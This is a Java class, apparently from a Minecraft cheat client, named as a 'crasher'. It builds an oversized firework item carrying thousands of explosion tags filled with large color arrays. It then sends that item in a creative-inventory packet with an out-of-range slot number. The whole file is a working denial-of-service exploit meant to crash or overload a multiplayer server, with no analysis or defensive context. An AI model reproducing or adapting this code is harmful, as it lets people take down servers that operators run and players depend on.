class GiveFireworkCrasher1 extends Thread {
   public void run() {
      try {
         ItemStack firework = new ItemStack(Items.FIREWORKS);
         NBTTagCompound tagf = new NBTTagCompound();
         NBTTagCompound tage = new NBTTagCompound();
         NBTTagList list = new NBTTagList();
         int[] i = new int[64];

         int i3;
         for(i3 = 0; i3 < 3260; ++i3) {
            Arrays.fill(i, i3 + 1);
            NBTTagCompound tagx = new NBTTagCompound();
            tagx.setIntArray("Colors", i);
            list.appendTag(tagx);
         }

         tage.setTag("Explosions", list);
         tage.setByte("Flight", (byte)2);
         tagf.setTag("Fireworks", tage);
         firework.setTagCompound(tagf);

         for(i3 = 0; i3 < 100; ++i3) {
         }

         Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(Integer.MAX_VALUE, firework));
      } catch (Exception var8) {
      }
   }
}
